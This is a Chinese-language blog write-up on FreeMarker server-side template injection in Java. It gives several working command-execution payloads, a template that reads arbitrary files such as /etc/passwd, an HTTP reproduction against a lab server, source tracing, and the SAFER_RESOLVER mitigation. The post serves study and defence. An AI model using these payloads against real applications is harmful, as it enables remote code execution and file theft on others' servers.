# Java安全之freemarker 模板注入

## freemarker 简述

FreeMarker 是一款 模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。

模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， 不是 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。

这种方式通常被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。

其实FreeMarker的原理就是：模板+数据模型=输出

## 内置函数

### new

可创建任意实现了`TemplateModel`接口的Java对象，同时还可以触发没有实现 `TemplateModel`接口的类的静态初始化块。
以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承`TemplateModel`接口的`freemarker.template.utility.JythonRuntime`和`freemarker.template.utility.Execute`。

### API

value?api 提供对 value 的 API（通常是 Java API）的访问，例如 `value?api.someJavaMethod()` 或 `value?api.someBeanProperty`。可通过 `getClassLoader`获取类加载器从而加载恶意类，或者也可以通过 `getResource`来实现任意文件读取。
但是，当`api_builtin_enabled`为true时才可使用api函数，而该配置在**2.3.22版本**之后默认为false。

POC1

```java
<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("open -a Calculator.app"")}
```

POC2

```java
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}
```

POC3

```java
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")
```

POC4

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("open -a Calculator.app") }
```

读取文件

```java
<#assign is=object?api.class.getResourceAsStream("/Test.class")>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

## 漏洞复现与分析

### 漏洞复现

```http
POST /template HTTP/1.1
Host: 192.168.2.10:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 344

{"hello.ftl": "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a Calculator.app\") }<title>Hello!</title><link href=\"/css/main.css\" rel=\"stylesheet\"></head><body><h2 class=\"hello-title\">Hello!</h2><script src=\"/js/main.js\"></script></body></html>"}
POST /hello HTTP/1.1
Host: 192.168.2.10:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 15

{"name": "aaa"}
```

![image-20220502155117356](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003317254-2097732598.png)

### 漏洞分析

```java
  public String template(@RequestBody Map<String,String> templates) throws IOException {
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        for(String templateKey : templates.keySet()){
            stringLoader.putTemplate(templateKey, templates.get(templateKey));
        }
        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader,
            con.getTemplateLoader()}));
        return "index";
    }
```

上面代码`stringLoader.putTemplate`可设置模板内容，动态添加模板内容。当调用到构造的模板内容时，就会执行构造的恶意表达式。

```java
public String hello(@RequestBody Map<String,Object> body, Model model) {
        model.addAttribute("name", body.get("name"));
        return "hello";
    }
```

上面payload构造了`hello.ftl`模板，在hello方法中`return "hello"`，即会调用`hello.ftl`模板。

## 解析流程

```
org.springframework.web.servlet.view.UrlBasedViewResolver#createView
```

执行到`return super.createView(viewName, locale);`

开始走freemarker的视图解析

省略冗余代码流程来到

```java
  protected View loadView(String viewName, Locale locale) throws Exception {
        AbstractUrlBasedView view = this.buildView(viewName);
        View result = this.applyLifecycleMethods(viewName, view);//反射获取实例
        return view.checkResource(locale) ? result : null;
    }
org.springframework.web.servlet.view.UrlBasedViewResolver#buildView
protected AbstractUrlBasedView buildView(String viewName) throws Exception {
        AbstractUrlBasedView view = (AbstractUrlBasedView)BeanUtils.instantiateClass(this.getViewClass());
        view.setUrl(this.getPrefix() + viewName + this.getSuffix());
        String contentType = this.getContentType();
        if (contentType != null) {
            view.setContentType(contentType);
        }

        view.setRequestContextAttribute(this.getRequestContextAttribute());
        view.setAttributesMap(this.getAttributesMap());
        Boolean exposePathVariables = this.getExposePathVariables();
        if (exposePathVariables != null) {
            view.setExposePathVariables(exposePathVariables);
        }

        Boolean exposeContextBeansAsAttributes = this.getExposeContextBeansAsAttributes();
        if (exposeContextBeansAsAttributes != null) {
            view.setExposeContextBeansAsAttributes(exposeContextBeansAsAttributes);
        }

        String[] exposedContextBeanNames = this.getExposedContextBeanNames();
        if (exposedContextBeanNames != null) {
            view.setExposedContextBeanNames(exposedContextBeanNames);
        }

        return view;
    }
```

![image-20220502170054787](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003329640-1077535907.png)

设置url然后为其添加`.ftl`后缀

```
org.springframework.web.servlet.view.UrlBasedViewResolver#loadView`调用`view.checkResource(locale)
org.springframework.web.servlet.view.freemarker.FreeMarkerView#checkResource
 public boolean checkResource(Locale locale) throws Exception {
        String url = this.getUrl();

        try {
            this.getTemplate(url, locale);
```

获取view中的url，handle 执行，return回来的值，拼接上`.ftl`

```
freemarker.template.Configuration#getTemplate(java.lang.String, java.util.Locale, java.lang.Object, java.lang.String, boolean, boolean)
```

![image-20220502170641534](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003336253-1727847900.png)

这里从cache里面取值，而在我们`putTemplate`设置模板的时候，也会将至存储到cache中。

![image-20220502171601818](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003342129-479246546.png)

去除冗余代码，来到`freemarker.cache.TemplateCache.TemplateCacheTemplateLookupContext#lookupWithLocalizedThenAcquisitionStrategy`

![image-20220502172112649](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003346133-2125131883.png)

```
freemarker.cache.TemplateCache#lookupTemplateWithAcquisitionStrategy
```

代码会先拼接`_zh_CN`,再寻找未拼接`_zh_CN`的模板名，调用`this.findTemplateSource(path)`获取模板实例。

![image-20220502172343305](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003355207-213374480.png)

![image-20220502172307328](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003404519-1885359889.png)

这里就获取到了handle执行返回的模板视图实例。

`org.springframework.web.servlet.DispatcherServlet#doDispatch`流程

handle 执行完成后调用 `this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);`进行模板解析。

调用`view.render(mv.getModelInternal(), request, response);`

![image-20220502174005269](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003409974-740146188.png)

```
org.springframework.web.servlet.view.freemarker.FreeMarkerView#processTemplate
 protected void processTemplate(Template template, SimpleHash model, HttpServletResponse response) throws IOException, TemplateException {
        template.process(model, response.getWriter());
    }
freemarker.template.Template#process(java.lang.Object, java.io.Writer)
public void process(Object dataModel, Writer out) throws TemplateException, IOException {
    this.createProcessingEnvironment(dataModel, out, (ObjectWrapper)null).process();
}
```

![image-20220502174326322](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003415530-762294932.png)

![image-20220502174518915](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003423368-624291399.png)

来到`freemarker.core.MethodCall#_eval`看具体实现

```java
TemplateModel _eval(Environment env) throws TemplateException {
        TemplateModel targetModel = this.target.eval(env);
        if (targetModel instanceof TemplateMethodModel) {
            TemplateMethodModel targetMethod = (TemplateMethodModel)targetModel;
            List argumentStrings = targetMethod instanceof TemplateMethodModelEx ? this.arguments.getModelList(env) : this.arguments.getValueList(env);
            Object result = targetMethod.exec(argumentStrings);
            return env.getObjectWrapper().wrap(result);
        } else if (targetModel instanceof Macro) {
            Macro func = (Macro)targetModel;
            env.setLastReturnValue((TemplateModel)null);
            if (!func.isFunction()) {
                throw new _MiscTemplateException(env, "A macro cannot be called in an expression. (Functions can be.)");
            } else {
                Writer prevOut = env.getOut();

                try {
                    env.setOut(NullWriter.INSTANCE);
                    env.invoke(func, (Map)null, this.arguments.items, (List)null, (TemplateElement[])null);
                } catch (IOException var9) {
                    throw new TemplateException("Unexpected exception during function execution", var9, env);
                } finally {
                    env.setOut(prevOut);
                }

                return env.getLastReturnValue();
            }
        } else {
            throw new NonMethodException(this.target, targetModel, env);
        }
    }
```

调用`this.target.eval(env);`获取实例，然后前面会判断是否为`TemplateMethodModel`类型，然后调用exec方法。

```java
public Object exec(List arguments) throws TemplateModelException {
    ObjectWrapper ow = this.env.getObjectWrapper();
    BeansWrapper bw = ow instanceof BeansWrapper ? (BeansWrapper)ow : BeansWrapper.getDefaultInstance();
    return bw.newInstance(this.cl, arguments);
}
```

反射调用，这里会返回一个`freemarker.template.utility.Execute`的实例。

第二次调用`freemarker.core.Identifier#_eval`的时候,执行获取

![image-20220503000138787](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003429027-1448984101.png)

![image-20220503000218286](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003434231-131346647.png)

然后最后走到`freemarker.template.utility.Execute#exec`

![image-20220502223855377](https://img2022.cnblogs.com/blog/1993669/202205/1993669-20220503003439902-236460613.png)

### 漏洞修复

测试代码

简化了一下，代码如下：

```java
package freemarker;

import freemarker.cache.StringTemplateLoader;
import freemarker.core.TemplateClassResolver;
import freemarker.template.Configuration;
import freemarker.template.Template;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringWriter;
import java.util.HashMap;

public class freemarker_ssti {
    public static void main(String[] args) throws Exception {

        //设置模板
        HashMap<String, String> map = new HashMap<String, String>();
        String poc ="<#assign aaa=\"freemarker.template.utility.Execute\"?new()> ${ aaa(\"open -a Calculator.app\") }";
        System.out.println(poc);
        StringTemplateLoader stringLoader = new StringTemplateLoader();
        Configuration cfg = new Configuration();
        stringLoader.putTemplate("name",poc);
        cfg.setTemplateLoader(stringLoader);
        //cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
        //处理解析模板
        Template Template_name = cfg.getTemplate("name");
        StringWriter stringWriter = new StringWriter();

        Template_name.process(Template_name,stringWriter);


    }
}
```

设置`cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);`

设置`cfg.setNewBuiltinClassResolver`会 加入一个校验，传递为`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`过滤。

```java
  TemplateClassResolver SAFER_RESOLVER = new TemplateClassResolver() {
        public Class resolve(String className, Environment env, Template template) throws TemplateException {
            if (!className.equals(ObjectConstructor.class.getName()) && !className.equals(Execute.class.getName()) && !className.equals("freemarker.template.utility.JythonRuntime")) {
                try {
                    return ClassUtil.forName(className);
                } catch (ClassNotFoundException var5) {
                    throw new _MiscTemplateException(var5, env);
                }
            } else {
                throw MessageUtil.newInstantiatingClassNotAllowedException(className, env);
            }
        }
    };
```

从 **2.3.17**版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：
1、UNRESTRICTED_RESOLVER：可以通过 `ClassUtil.forName(className)` 获取任何类。

2、SAFER_RESOLVER：不能加载 `freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类。
3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。
可通过`freemarker.core.Configurable#setNewBuiltinClassResolver`方法设置`TemplateClassResolver`，从而限制通过`new()`函数对`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类的解析。

开发资料

https://freemarker.apache.org/docs/api/index.html

https://vimsky.com/examples/detail/java-method-freemarker.cache.StringTemplateLoader.putTemplate.html

### 参考

[服务器端模版注入SSTI分析与归纳](https://tttang.com/archive/1412/#toc_freemarker_1)

[Freemarker模板注入 Bypass](https://xz.aliyun.com/t/4846)